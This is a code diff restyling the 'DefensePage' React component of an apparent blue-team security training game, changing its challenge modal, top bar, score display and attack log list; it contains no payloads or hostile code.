-                    style={{ fontSize: 22, fontWeight: 700, color: "#34D399" }}
+                    style={{
+                      fontSize: 26,
+                      fontWeight: 800,
+                      color: "#4ade80",
+                      letterSpacing: "-0.03em",
+                    }}
                   >
                     +{challenge.points}
                   </div>
@@ -1016,83 +849,115 @@ export default function DefensePage() {
                 <button
                   onClick={closeChallenge}
                   style={{
-                    fontFamily: mono,
-                    background: "rgba(255,255,255,0.04)",
-                    border: bdr,
-                    borderRadius: 5,
-                    padding: "8px 12px",
-                    color: "rgba(255,255,255,0.45)",
+                    fontFamily: sans,
+                    background: "transparent",
+                    border: "1px solid #2a2a30",
+                    borderRadius: 8,
+                    padding: "8px 14px",
+                    color: "#78716c",
                     cursor: "pointer",
                     fontSize: 12,
+                    fontWeight: 600,
+                    letterSpacing: "0.04em",
                   }}
                 >
-                  ✕ Close
+                  ESC ✕
                 </button>
               </div>
             </div>
 
             {/* Modal body */}
             <div style={{ display: "flex", flex: 1, minHeight: 0 }}>
-              {/* Left: code area */}
+              {/* Left — code editor area */}
               <div
                 style={{
                   flex: 1,
                   display: "flex",
                   flexDirection: "column",
-                  borderRight: bdr,
                   minWidth: 0,
+                  background: "#0d0d10",
                 }}
               >
-                {/* Vulnerable code toggle */}
+                {/* Vuln toggle bar */}
                 <div
                   style={{
-                    padding: "10px 16px",
-                    borderBottom: bdr,
+                    padding: "10px 20px",
+                    borderBottom: "1px solid #1e1e24",
                     flexShrink: 0,
                     display: "flex",
                     alignItems: "center",
-                    gap: 10,
+                    gap: 12,
                   }}
                 >
                   <button
                     onClick={() => setShowVulnerable((v) => !v)}
                     style={{
-                      fontFamily: mono,
-                      background: "rgba(255,51,102,0.08)",
-                      border: "1px solid rgba(255,51,102,0.25)",
-                      borderRadius: 5,
-                      padding: "6px 12px",
-                      color: "#FF6680",
+                      fontFamily: sans,
+                      background: showVulnerable
+                        ? "rgba(239,68,68,0.12)"
+                        : "transparent",
+                      border: `1px solid ${showVulnerable ? "rgba(239,68,68,0.35)" : "#2a2a30"}`,
+                      borderRadius: 6,
+                      padding: "5px 12px",
+                      color: showVulnerable ? "#f87171" : "#6b6b70",
                       cursor: "pointer",
                       fontSize: 11,
                       fontWeight: 700,
+                      letterSpacing: "0.06em",
+                      transition: "all 0.15s",
                     }}
                   >
-                    {showVulnerable
-                      ? "▲ Hide Vulnerable Code"
-                      : "▼ Show Vulnerable Code"}
+                    {showVulnerable ? "▲ HIDE VULN CODE" : "▼ SHOW VULN CODE"}
                   </button>
-                  <span
-                    style={{ fontSize: 10, color: "rgba(255,255,255,0.25)" }}
+                  <button
+                    onClick={() => setShowHint((h) => !h)}
+                    style={{
+                      fontFamily: sans,
+                      background: showHint
+                        ? "rgba(251,191,36,0.1)"
+                        : "transparent",
+                      border: `1px solid ${showHint ? "rgba(251,191,36,0.3)" : "#2a2a30"}`,
+                      borderRadius: 6,
+                      padding: "5px 12px",
+                      color: showHint ? "#fbbf24" : "#6b6b70",
+                      cursor: "pointer",
+                      fontSize: 11,
+                      fontWeight: 700,
+                      letterSpacing: "0.06em",
+                      transition: "all 0.15s",
+                    }}
                   >
-                    Study the bug before writing your fix
-                  </span>
+                    💡 {showHint ? "HIDE HINT" : "NEED A HINT?"}
+                  </button>
                 </div>
+
+                {/* Vulnerable code */}
                 {showVulnerable && (
                   <div
                     style={{
-                      padding: "12px 16px",
-                      background: "rgba(255,51,102,0.04)",
-                      borderBottom: bdr,
+                      padding: "14px 20px",
+                      background: "rgba(239,68,68,0.05)",
+                      borderBottom: "1px solid rgba(239,68,68,0.15)",
                       flexShrink: 0,
                     }}
                   >
+                    <div
+                      style={{
+                        fontSize: 10,
+                        fontWeight: 700,
+                        color: "#f87171",
+                        letterSpacing: "0.1em",
+                        marginBottom: 8,
+                      }}
+                    >
+                      ❌ VULNERABLE CODE
+                    </div>
                     <pre
                       style={{
                         margin: 0,
-                        fontSize: 11,
+                        fontSize: 12,
                         color: "#fca5a5",
-                        lineHeight: 1.65,
+                        lineHeight: 1.7,
                         whiteSpace: "pre-wrap",
                         wordBreak: "break-all",
                         fontFamily: mono,
@@ -1103,61 +968,63 @@ export default function DefensePage() {
                   </div>
                 )}
 
-                {/* Hint toggle */}
-                <div
-                  style={{
-                    padding: "10px 16px",
-                    borderBottom: bdr,
-                    flexShrink: 0,
-                    display: "flex",
-                    justifyContent: "space-between",
-                    alignItems: "center",
-                  }}
-                >
-                  <span
-                    style={{
-                      fontSize: 10,
-                      fontWeight: 700,
-                      letterSpacing: "0.1em",
-                      color: "rgba(255,255,255,0.3)",
-                    }}
-                  >
-                    YOUR FIX
-                  </span>
-                  <button
-                    onClick={() => setShowHint((h) => !h)}
-                    style={{
-                      fontFamily: mono,
-                      background: "rgba(250,204,21,0.08)",
-                      border: "1px solid rgba(250,204,21,0.25)",
-                      borderRadius: 5,
-                      padding: "5px 10px",
-                      color: "#FACC15",
-                      cursor: "pointer",
-                      fontSize: 10,
-                      fontWeight: 700,
-                    }}
-                  >
-                    💡 {showHint ? "Hide Hint" : "Need a Hint?"}
-                  </button>
-                </div>
+                {/* Hint */}
                 {showHint && (
                   <div
                     style={{
-                      padding: "10px 16px",
-                      background: "rgba(250,204,21,0.05)",
-                      borderBottom: bdr,
-                      fontSize: 11,
-                      color: "#fef08a",
-                      lineHeight: 1.6,
+                      padding: "12px 20px",
+                      background: "rgba(251,191,36,0.05)",
+                      borderBottom: "1px solid rgba(251,191,36,0.15)",
                       flexShrink: 0,
+                      fontSize: 13,
+                      color: "#fbbf24",
+                      lineHeight: 1.6,
                     }}
                   >
-                    {challenge.hint}
+                    💡 {challenge.hint}
                   </div>
                 )}
 
-                {/* Code editor */}
+                {/* Editor label */}
+                <div
+                  style={{
+                    padding: "10px 20px 0",
+                    flexShrink: 0,
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "space-between",
+                  }}
+                >
+                  <div
+                    style={{ display: "flex", alignItems: "center", gap: 8 }}
+                  >
+                    <div
+                      style={{
+                        width: 8,
+                        height: 8,
+                        borderRadius: "50%",
+                        background: "#4ade80",
+                      }}
+                    />
+                    <span
+                      style={{
+                        fontSize: 10,
+                        fontWeight: 700,
+                        color: "#4ade80",
+                        letterSpacing: "0.1em",
+                      }}
+                    >
+                      YOUR FIX
+                    </span>
+                  </div>
+                  <span
+                    style={{ fontSize: 10, color: "#3a3a42", fontFamily: mono }}
+                  >
+                    hotfix.ts
+                  </span>
+                </div>
+
+                {/* Textarea */}
                 <textarea
                   value={challengeCode}
                   onChange={(e) => {
@@ -1170,43 +1037,40 @@ export default function DefensePage() {
                   spellCheck={false}
                   style={{
                     flex: 1,
-                    background: "#08090f",
-                    color: "#7dd3fc",
+                    background: "#0d0d10",
+                    color: "#d4d0c8",
                     fontFamily: mono,
-                    fontSize: 12,
-                    lineHeight: 1.75,
-                    padding: "14px 16px",
+                    fontSize: 13,
+                    lineHeight: 1.8,
+                    padding: "12px 20px 20px",
                     border: "none",
                     outline: "none",
                     resize: "none",
-                    minHeight: 240,
+                    minHeight: 220,
+                    tabSize: 2,
                   }}
                 />
               </div>
 
-              {/* Right: validator + effects */}
+              {/* Right — validator panel */}
               <div
                 style={{
-                  width: 290,
+                  width: 300,
+                  flexShrink: 0,
                   display: "flex",
                   flexDirection: "column",
-                  flexShrink: 0,
+                  borderLeft: "1px solid #1e1e24",
+                  background: "#111115",
                 }}
               >
+                {/* Run button area */}
                 <div
-                  style={{ padding: "16px", borderBottom: bdr, flexShrink: 0 }}
+                  style={{
+                    padding: "20px",
+                    borderBottom: "1px solid #1e1e24",
+                    flexShrink: 0,
+                  }}
                 >
-                  <div
-                    style={{
-                      fontSize: 10,
-                      fontWeight: 700,
-                      letterSpacing: "0.1em",
-                      color: "rgba(255,255,255,0.3)",
-                      marginBottom: 12,
-                    }}
-                  >
-                    VALIDATOR
-                  </div>
                   <button
                     onClick={submitChallenge}
                     disabled={
@@ -1214,55 +1078,60 @@ export default function DefensePage() {
                       challengeResult === "pass"
                     }
                     style={{
-                      fontFamily: mono,
+                      fontFamily: sans,
                       width: "100%",
                       padding: "13px",
-                      borderRadius: 6,
-                      fontSize: 12,
+                      borderRadius: 8,
+                      fontSize: 13,
                       fontWeight: 700,
-                      cursor:
-                        challengeResult === "pass" ? "default" : "pointer",
+                      letterSpacing: "0.04em",
                       border: "none",
+                      cursor:
+                        challengeResult === "pass"
+                          ? "default"
+                          : challengeResult === "running"
+                            ? "wait"
+                            : "pointer",
                       background:
                         challengeResult === "pass"
-                          ? "rgba(52,211,153,0.15)"
+                          ? "rgba(74,222,128,0.12)"
                           : challengeResult === "running"
-                            ? "rgba(52,211,153,0.1)"
-                            : "#34D399",
+                            ? "#1e1e24"
+                            : "#4ade80",
                       color:
                         challengeResult === "pass"
-                          ? "#34D399"
+                          ? "#4ade80"
                           : challengeResult === "running"
-                            ? "#34D399"
-                            : "#05060f",
+                            ? "#3a3a42"
+                            : "#0a1a0a",
                       transition: "all 0.15s",
-                      marginBottom: 12,
                     }}
                   >
                     {challengeResult === "running"
-                      ? "Validating..."
+                      ? "⟳  Validating…"
                       : challengeResult === "pass"
-                        ? "✓ Fix Deployed!"
-                        : "▶ Run Validator"}
+                        ? "✓  Fix Deployed!"
+                        : "▶  Run Validator"}
                   </button>
 
                   {challengeFeedback && (
                     <div
                       style={{
-                        padding: "10px 12px",
-                        borderRadius: 6,
-                        fontSize: 11,
-                        lineHeight: 1.6,
+                        marginTop: 12,
+                        padding: "11px 14px",
+                        borderRadius: 7,
+                        fontSize: 12,
+                        lineHeight: 1.65,
                         ...(challengeResult === "pass"
                           ? {
-                              background: "rgba(52,211,153,0.08)",
-                              border: "1px solid rgba(52,211,153,0.25)",
-                              color: "#34D399",
+                              background: "rgba(74,222,128,0.08)",
+                              border: "1px solid rgba(74,222,128,0.2)",
+                              color: "#4ade80",
                             }
                           : {
-                              background: "rgba(248,113,113,0.08)",
-                              border: "1px solid rgba(248,113,113,0.25)",
-                              color: "#fca5a5",
+                              background: "rgba(239,68,68,0.08)",
+                              border: "1px solid rgba(239,68,68,0.2)",
+                              color: "#f87171",
                             }),
                       }}
                     >
@@ -1271,133 +1140,178 @@ export default function DefensePage() {
                   )}
                 </div>
 
-                <div style={{ padding: "16px", flex: 1 }}>
+                {/* Effects */}
+                <div style={{ padding: "20px", overflowY: "auto", flex: 1 }}>
                   <div
                     style={{
                       fontSize: 10,
                       fontWeight: 700,
                       letterSpacing: "0.1em",
-                      color: "rgba(255,255,255,0.3)",
-                      marginBottom: 12,
+                      color: "#3a3a42",
+                      marginBottom: 14,
                     }}
                   >
-                    GLOBAL EFFECT ON PASS
+                    ON PASS — GLOBAL EFFECTS
                   </div>
-                  <ul
+                  <div
                     style={{
-                      paddingLeft: 16,
-                      margin: 0,
                       display: "flex",
                       flexDirection: "column",
                       gap: 10,
-                      fontSize: 11,
-                      color: "rgba(255,255,255,0.4)",
-                      lineHeight: 1.6,
                     }}
                   >
-                    <li>
-                      All existing{" "}
-                      <span
-                        style={{
-                          color: challengeType ? SEV_CONFIG.critical.color : "",
-                        }}
-                      >
-                        {challengeType ? TYPE_LABELS[challengeType] : ""}
-                      </span>{" "}
-                      logs marked as patched
-                    </li>
-                    <li>
-                      New attacks of this type{" "}
-                      <strong style={{ color: "#f1f5f9" }}>
-                        stop spawning
-                      </strong>
-                    </li>
-                    <li>
-                      Score +
-                      <strong style={{ color: "#34D399" }}>
-                        {challenge.points} pts
-                      </strong>{" "}
-                      awarded
-                    </li>
-                  </ul>
+                    {[
+                      {
+                        icon: "⬛",
+                        text: `All ${challengeType ? TYPE_LABELS[challengeType] : ""} logs marked fixed`,
+                      },
+                      {
+                        icon: "◼",
+                        text: "New attacks of this type stop spawning",
+                      },
+                      challengeType === "sqli"
+                        ? {
+                            icon: "◼",
+                            text: "Login page shows patch banner live",
+                          }
+                        : null,
+                      challengeType === "jwt_forge"
+                        ? {
+                            icon: "◼",
+                            text: "Profile page blocks forge attempts live",
+                          }
+                        : null,
+                      {
+                        icon: "◆",
+                        text: `+${challenge.points} pts added to your score`,
+                      },
+                    ]
+                      .filter(Boolean)
+                      .map((item, i) => (
+                        <div
+                          key={i}
+                          style={{
+                            display: "flex",
+                            gap: 10,
+                            alignItems: "flex-start",
+                          }}
+                        >
+                          <span
+                            style={{
+                              fontSize: 8,
+                              color: "#3a3a42",
+                              marginTop: 4,
+                              flexShrink: 0,
+                            }}
+                          >
+                            {item!.icon}
+                          </span>
+                          <span
+                            style={{
+                              fontSize: 12,
+                              color: "#6b6b70",
+                              lineHeight: 1.6,
+                            }}
+                          >
+                            {item!.text}
+                          </span>
+                        </div>
+                      ))}
+                  </div>
 
                   {challengeResult === "pass" && (
                     <div
                       style={{
                         marginTop: 20,
-                        padding: 12,
-                        background: "rgba(52,211,153,0.06)",
-                        border: "1px solid rgba(52,211,153,0.2)",
-                        borderRadius: 6,
+                        padding: "14px",
+                        background: "rgba(74,222,128,0.08)",
+                        border: "1px solid rgba(74,222,128,0.2)",
+                        borderRadius: 8,
                       }}
                     >
                       <div
                         style={{
-                          fontSize: 10,
+                          fontSize: 11,
                           fontWeight: 700,
-                          color: "#34D399",
-                          letterSpacing: "0.08em",
-                          marginBottom: 6,
+                          color: "#4ade80",
+                          letterSpacing: "0.06em",
+                          marginBottom: 5,
                         }}
                       >
                         ✓ VULNERABILITY CLOSED
                       </div>
                       <div
                         style={{
-                          fontSize: 11,
-                          color: "rgba(255,255,255,0.4)",
-                          lineHeight: 1.55,
+                          fontSize: 12,
+                          color: "#86efac",
+                          lineHeight: 1.6,
                         }}
                       >
                         {challengeType ? TYPE_LABELS[challengeType] : ""}{" "}
-                        attacks have been halted globally. Attackers can no
-                        longer exploit this vector.
+                        attacks halted.
+                        {challengeType === "sqli" &&
+                          " Login page is now patched."}
+                        {challengeType === "jwt_forge" &&
+                          " Profile page now blocks forges."}
                       </div>
                     </div>
                   )}
 
-                  {/* Scoring reference */}
-                  <div style={{ marginTop: 20 }}>
+                  {/* Score table */}
+                  <div style={{ marginTop: 24 }}>
                     <div
                       style={{
                         fontSize: 10,
                         fontWeight: 700,
                         letterSpacing: "0.1em",
-                        color: "rgba(255,255,255,0.3)",
-                        marginBottom: 10,
+                        color: "#3a3a42",
+                        marginBottom: 12,
                       }}
                     >
-                      SCORE TABLE
+                      CHALLENGE BOARD
                     </div>
                     {Object.entries(CHALLENGES).map(([type, ch]) => {
                       const done = patchedTypes.has(type as AttackType);
+                      const tc = TYPE_COLORS[type as AttackType];
                       return (
                         <div
                           key={type}
                           style={{
                             display: "flex",
                             justifyContent: "space-between",
-                            padding: "6px 0",
-                            borderBottom: "1px solid rgba(255,255,255,0.04)",
-                            opacity: done ? 0.4 : 1,
+                            alignItems: "center",
+                            padding: "9px 0",
+                            borderBottom: "1px solid #1e1e24",
+                            opacity: done ? 0.5 : 1,
                           }}
                         >
-                          <span
+                          <div
                             style={{
-                              fontSize: 10,
-                              color: done
-                                ? "#34D399"
-                                : "rgba(255,255,255,0.35)",
+                              display: "flex",
+                              alignItems: "center",
+                              gap: 8,
                             }}
                           >
-                            {done ? "✓ " : ""}
-                            {TYPE_LABELS[type as AttackType]}
-                          </span>
+                            {done && (
+                              <span style={{ fontSize: 10, color: "#4ade80" }}>
+                                ✓
+                              </span>
+                            )}
+                            <span
+                              style={{
+                                fontSize: 11,
+                                fontWeight: 600,
+                                color: done ? "#4ade80" : tc.text,
+                              }}
+                            >
+                              {TYPE_LABELS[type as AttackType]}
+                            </span>
+                          </div>
                           <span
                             style={{
-                              fontSize: 10,
+                              fontSize: 12,
                               fontWeight: 700,
-                              color: done ? "#34D399" : "rgba(255,255,255,0.4)",
+                              color: done ? "#4ade80" : "#4a4a52",
                             }}
                           >
                             +{ch!.points}
@@ -1413,63 +1327,72 @@ export default function DefensePage() {
         </div>
       )}
 
-      {/* ── TOP BAR ── */}
+      {/* ── TOP BAR ─────────────────────────────────────────────────── */}
       <header
         style={{
           display: "flex",
           alignItems: "center",
           justifyContent: "space-between",
-          padding: "0 20px",
-          height: 56,
-          background: "rgba(0,0,0,0.5)",
-          backdropFilter: "blur(12px)",
-          borderBottom: bdr,
+          padding: "0 28px",
+          height: 58,
+          background: "#111115",
+          borderBottom: "1px solid #1e1e24",
           flexShrink: 0,
-          gap: 12,
-          flexWrap: "wrap",
+          gap: 16,
         }}
       >
-        <div
-          style={{
-            display: "flex",
-            alignItems: "center",
-            gap: 10,
-            flexWrap: "wrap",
-          }}
-        >
-          <div
-            style={{
-              background: "linear-gradient(135deg,#1d4ed8,#2563eb)",
-              color: "#bfdbfe",
-              fontSize: 10,
-              fontWeight: 700,
-              letterSpacing: "0.14em",
-              padding: "5px 11px",
-              borderRadius: 4,
-              boxShadow: "0 0 14px rgba(59,130,246,0.35)",
-              flexShrink: 0,
-            }}
-          >
-            BLUE TEAM
-          </div>
-          <div
-            style={{ fontSize: 13, fontWeight: 700, letterSpacing: "0.06em" }}
-          >
-            BREACH@TRIX{" "}
-            <span style={{ color: "rgba(255,255,255,0.28)", fontWeight: 400 }}>
-              // DEFENSE CONSOLE
+        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+            <div
+              style={{
+                width: 20,
+                height: 20,
+                background: "linear-gradient(135deg,#4ade80,#22d3ee)",
+                borderRadius: 5,
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+              }}
+            >
+              <svg width="11" height="11" viewBox="0 0 24 24" fill="none">
+                <path
+                  d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"
+                  fill="white"
+                />
+              </svg>
+            </div>
+            <span
+              style={{
+                fontSize: 13,
+                fontWeight: 800,
+                color: "#f0ece4",
+                letterSpacing: "-0.02em",
+              }}
+            >
+              BREACH<span style={{ color: "#4ade80" }}>@</span>TRIX
+            </span>
+            <span
+              style={{
+                fontSize: 11,
+                color: "#3a3a42",
+                fontWeight: 500,
+                marginLeft: 4,
+              }}
+            >
+              // blue team console
             </span>
           </div>
+
           {critCount > 0 && (
             <div
               style={{
                 display: "flex",
                 alignItems: "center",
-                gap: 7,
-                background: "rgba(255,51,102,0.1)",
-                border: "1px solid rgba(255,51,102,0.28)",
-                borderRadius: 5,
-                padding: "4px 10px",
+                gap: 6,
+                background: "rgba(239,68,68,0.1)",
+                border: "1px solid rgba(239,68,68,0.25)",
+                borderRadius: 6,
+                padding: "3px 10px",
               }}
             >
               <div
@@ -1477,57 +1400,59 @@ export default function DefensePage() {
                   width: 6,
                   height: 6,
                   borderRadius: "50%",
-                  background: "#FF3366",
-                  boxShadow: "0 0 8px #FF3366",
-                  animation: "pulse 1.4s infinite",
+                  background: "#ef4444",
+                  animation: "pulse 1.2s infinite",
                 }}
               />
               <span
                 style={{
                   fontSize: 10,
-                  color: "#FF3366",
+                  color: "#ef4444",
                   fontWeight: 700,
-                  letterSpacing: "0.1em",
+                  letterSpacing: "0.08em",
                 }}
               >
-                {critCount} CRITICAL
+                {critCount} CRITICAL ACTIVE
               </span>
             </div>
           )}
+
           {[...patchedTypes].map((t) => (
             <div
               key={t}
               style={{
                 display: "flex",
                 alignItems: "center",
-                gap: 4,
-                background: "rgba(52,211,153,0.07)",
-                border: "1px solid rgba(52,211,153,0.22)",
-                borderRadius: 5,
-                padding: "4px 9px",
+                gap: 5,
+                background: "rgba(74,222,128,0.08)",
+                border: "1px solid rgba(74,222,128,0.2)",
+                borderRadius: 6,
+                padding: "3px 10px",
               }}
             >
               <span
                 style={{
-                  fontSize: 9,
-                  color: "#34D399",
+                  fontSize: 10,
+                  color: "#4ade80",
                   fontWeight: 700,
-                  letterSpacing: "0.08em",
+                  letterSpacing: "0.06em",
                 }}
               >
-                ✓ {TYPE_LABELS[t].split(" ")[0]} PATCHED
+                ✓ {TYPE_LABELS[t].split(" ")[0]}
               </span>
             </div>
           ))}
         </div>
-        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
+
+        <div style={{ display: "flex", alignItems: "center", gap: 20 }}>
           <div style={{ textAlign: "right" }}>
             <div
               style={{
                 fontSize: 9,
-                color: "rgba(255,255,255,0.3)",
+                color: "#3a3a42",
+                fontWeight: 700,
                 letterSpacing: "0.1em",
-                marginBottom: 3,
+                marginBottom: 1,
               }}
             >
               SCORE
@@ -1535,143 +1460,230 @@ export default function DefensePage() {
             <div
               style={{
                 fontSize: 22,
-                fontWeight: 700,
-                color: "#34D399",
+                fontWeight: 800,
+                color: "#4ade80",
                 lineHeight: 1,
+                letterSpacing: "-0.03em",
+                fontFamily: mono,
               }}
             >
               {score.toLocaleString()}
             </div>
           </div>
+          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
           <div style={{ textAlign: "right" }}>
             <div
               style={{
                 fontSize: 9,
-                color: "rgba(255,255,255,0.3)",
+                color: "#3a3a42",
+                fontWeight: 700,
                 letterSpacing: "0.1em",
-                marginBottom: 3,
+                marginBottom: 1,
               }}
             >
               UPTIME
             </div>
             <div
               style={{
-                fontSize: 18,
+                fontSize: 17,
                 fontWeight: 700,
-                color: isRunning ? "#FACC15" : "rgba(255,255,255,0.3)",
+                color: isRunning ? "#e8e6e1" : "#3a3a42",
                 lineHeight: 1,
+                fontFamily: mono,
               }}
             >
               {fmtEl(elapsed)}
             </div>
           </div>
-          <button
-            onClick={() => setLogs([])}
-            style={{
-              fontFamily: mono,
-              fontSize: 11,
-              fontWeight: 700,
-              padding: "7px 12px",
-              borderRadius: 5,
-              cursor: "pointer",
-              background: "rgba(248,113,113,0.08)",
-              border: "1px solid #F87171",
-              color: "#F87171",
-            }}
-          >
-            ✕ CLEAR
-          </button>
-          <button
-            onClick={() => setIsRunning((v) => !v)}
-            style={{
-              fontFamily: mono,
-              fontSize: 11,
-              fontWeight: 700,
-              padding: "7px 12px",
-              borderRadius: 5,
-              cursor: "pointer",
-              ...(isRunning
-                ? {
-                    background: "rgba(250,204,21,0.08)",
-                    border: "1px solid #FACC15",
-                    color: "#FACC15",
-                  }
-                : {
-                    background: "rgba(52,211,153,0.08)",
-                    border: "1px solid #34D399",
-                    color: "#34D399",
-                  }),
-            }}
-          >
-            {isRunning ? "⏸ PAUSE" : "▶ RESUME"}
-          </button>
+          <div style={{ width: 1, height: 32, background: "#1e1e24" }} />
+          <div style={{ display: "flex", gap: 8 }}>
+            <button
+              onClick={() => setLogs([])}
+              style={{
+                fontFamily: sans,
+                fontSize: 11,
+                fontWeight: 700,
+                letterSpacing: "0.06em",
+                padding: "6px 12px",
+                borderRadius: 6,
+                cursor: "pointer",
+                background: "transparent",
+                border: "1px solid #2a2a30",
+                color: "#4a4a52",
+                transition: "all 0.1s",
+              }}
+              onMouseOver={(e) => {
+                e.currentTarget.style.borderColor = "#3a3a42";
+                e.currentTarget.style.color = "#78716c";
+              }}
+              onMouseOut={(e) => {
+                e.currentTarget.style.borderColor = "#2a2a30";
+                e.currentTarget.style.color = "#4a4a52";
+              }}
+            >
+              CLEAR
+            </button>
+            <button
+              onClick={() => setIsRunning((v) => !v)}
+              style={{
+                fontFamily: sans,
+                fontSize: 11,
+                fontWeight: 700,
+                letterSpacing: "0.06em",
+                padding: "6px 12px",
+                borderRadius: 6,
+                cursor: "pointer",
+                transition: "all 0.1s",
+                ...(isRunning
+                  ? {
+                      background: "rgba(251,191,36,0.1)",
+                      border: "1px solid rgba(251,191,36,0.25)",
+                      color: "#fbbf24",
+                    }
+                  : {
+                      background: "rgba(74,222,128,0.1)",
+                      border: "1px solid rgba(74,222,128,0.25)",
+                      color: "#4ade80",
+                    }),
+              }}
+            >
+              {isRunning ? "⏸ PAUSE" : "▶ RESUME"}
+            </button>
+          </div>
         </div>
       </header>
 
-      {/* ── MAIN GRID ── */}
+      {/* ── MAIN LAYOUT ──────────────────────────────────────────────── */}
       <div
         style={{
           display: "flex",
           flex: 1,
           minHeight: 0,
-          height: "calc(100vh - 56px)",
+          height: "calc(100vh - 58px)",
         }}
       >
-        {/* LEFT: Log list */}
+        {/* ── LEFT: LOG LIST ── */}
         <div
           style={{
             flex: 1,
             display: "flex",
             flexDirection: "column",
-            borderRight: bdr,
+            borderRight: "1px solid #1e1e24",
             minWidth: 0,
           }}
         >
+          {/* Filter tabs + count */}
           <div
             style={{
               display: "flex",
+              alignItems: "center",
               justifyContent: "space-between",
-              padding: "11px 18px",
-              borderBottom: bdr,
+              padding: "0 24px",
+              borderBottom: "1px solid #1e1e24",
+              background: "#111115",
               flexShrink: 0,
             }}
           >
+            <div style={{ display: "flex", gap: 0 }}>
+              {(["all", "acknowledged", "fixed"] as FilterTab[]).map((tab) => {
+                const labels: Record<FilterTab, string> = {
+                  all: "All Events",
+                  acknowledged: "Acknowledged",
+                  fixed: "Fixed",
+                };
+                const active = filterTab === tab;
+                return (
+                  <button
+                    key={tab}
+                    onClick={() => setFilterTab(tab)}
+                    style={{
+                      fontFamily: sans,
+                      background: "transparent",
+                      border: "none",
+                      borderBottom: `2px solid ${active ? "#4ade80" : "transparent"}`,
+                      padding: "14px 18px",
+                      fontSize: 11,
+                      fontWeight: 700,
+                      letterSpacing: "0.08em",
+                      color: active ? "#4ade80" : "#4a4a52",
+                      cursor: "pointer",
+                      transition: "all 0.15s",
+                      display: "flex",
+                      alignItems: "center",
+                      gap: 7,
+                    }}
+                  >
+                    {labels[tab]}
+                    <span
+                      style={{
+                        fontSize: 10,
+                        fontWeight: 700,
+                        padding: "1px 6px",
+                        borderRadius: 10,
+                        background: active
+                          ? "rgba(74,222,128,0.15)"
+                          : "#1e1e24",
+                        color: active ? "#4ade80" : "#3a3a42",
+                      }}
+                    >
+                      {tabCounts[tab]}
+                    </span>
+                  </button>
+                );
+              })}
+            </div>
             <span
               style={{
                 fontSize: 10,
                 fontWeight: 700,
-                letterSpacing: "0.1em",
-                color: "rgba(255,255,255,0.35)",
+                letterSpacing: "0.08em",
+                color: isRunning ? "#4ade80" : "#4a4a52",
+                display: "flex",
+                alignItems: "center",
+                gap: 5,
               }}
             >
-              LIVE NETWORK TRAFFIC ({logs.length})
-            </span>
-            <span style={{ fontSize: 10, color: "rgba(255,255,255,0.2)" }}>
-              {isRunning ? "● LIVE" : "⏸ PAUSED"}
+              {isRunning && (
+                <span
+                  style={{
+                    display: "inline-block",
+                    width: 5,
+                    height: 5,
+                    borderRadius: "50%",
+                    background: "#4ade80",
+                    animation: "pulse 1.2s infinite",
+                  }}
+                />
+              )}
+              {isRunning ? "LIVE" : "PAUSED"}
             </span>
           </div>
+
+          {/* Column headers */}
           <div
             style={{
               display: "grid",
-              gridTemplateColumns: "96px 80px 120px 1fr 112px",
-              padding: "8px 18px",
-              background: "rgba(0,0,0,0.4)",
-              borderBottom: bdr,
+              gridTemplateColumns: "88px 82px 130px 1fr 110px",
+              padding: "9px 24px",
+              background: "#0d0d10",
+              borderBottom: "1px solid #1e1e24",
               fontSize: 10,
               fontWeight: 700,
               letterSpacing: "0.1em",
-              color: "rgba(255,255,255,0.22)",
+              color: "#3a3a42",
               flexShrink: 0,
             }}
           >
-            <span>TIMESTAMP</span>
-            <span>SEVERITY</span>
+            <span>TIME</span>
+            <span>SEV</span>
             <span>VECTOR</span>
-            <span>ATTACKER / DETAILS</span>
+            <span>ATTACKER / DETAIL</span>
             <span style={{ textAlign: "right" }}>STATUS</span>
           </div>
+
+          {/* Log rows */}
           <div style={{ flex: 1, overflowY: "auto" }}>
-            {logs.length === 0 && (
+            {filteredLogs.length === 0 && (
               <div
                 style={{
                   display: "flex",
@@ -1679,17 +1691,29 @@ export default function DefensePage() {
                   alignItems: "center",
                   justifyContent: "center",
                   height: 200,
-                  color: "rgba(255,255,255,0.18)",
-                  fontSize: 11,
-                  gap: 8,
+                  gap: 12,
                 }}
               >
-                <div style={{ fontSize: 36, opacity: 0.1 }}>◎</div>NO EVENTS
-                RECORDED
+                <div style={{ fontSize: 32, color: "#2a2a30" }}>◎</div>
+                <div
+                  style={{
+                    fontSize: 12,
+                    color: "#3a3a42",
+                    fontWeight: 600,
+                    letterSpacing: "0.06em",
+                  }}
+                >
+                  {filterTab === "acknowledged"
+                    ? "NO ACKNOWLEDGED THREATS"
+                    : filterTab === "fixed"
+                      ? "NO PATCHED VULNERABILITIES YET"
+                      : "NO EVENTS RECORDED"}
+                </div>
               </div>
             )}
-            {logs.map((log) => {
+            {filteredLogs.map((log) => {
               const sev = SEV_CONFIG[log.severity];
+              const tc = TYPE_COLORS[log.type];
               const isSel = selected === log.id;
               const isGP = patchedTypes.has(log.type);
               return (
@@ -1698,59 +1722,83 @@ export default function DefensePage() {
                   onClick={() => setSelected(isSel ? null : log.id)}
                   style={{
                     display: "grid",
-                    gridTemplateColumns: "96px 80px 120px 1fr 112px",
+                    gridTemplateColumns: "88px 82px 130px 1fr 110px",
                     alignItems: "center",
-                    padding: "10px 18px",
-                    borderBottom: "1px solid rgba(255,255,255,0.03)",
-                    borderLeft: `3px solid ${isSel ? sev.color : "transparent"}`,
-                    background: isSel ? sev.bg : "transparent",
+                    padding: "11px 24px",
+                    borderBottom: "1px solid #16161a",
+                    borderLeft: `3px solid ${isSel ? sev.dot : "transparent"}`,
+                    background: isSel ? "#141418" : "transparent",
                     cursor: "pointer",
-                    opacity: isGP ? 0.28 : 1,
+                    opacity: isGP ? 0.35 : 1,
                     transition: "background 0.1s",
+                  }}
+                  onMouseOver={(e) => {
+                    if (!isSel) e.currentTarget.style.background = "#111115";
+                  }}
+                  onMouseOut={(e) => {
+                    if (!isSel)
+                      e.currentTarget.style.background = "transparent";
                   }}
                 >
                   <span
-                    style={{ fontSize: 11, color: "rgba(255,255,255,0.3)" }}
+                    style={{ fontSize: 11, color: "#4a4a52", fontFamily: mono }}
                   >
                     {fmt(log.ts)}
                   </span>
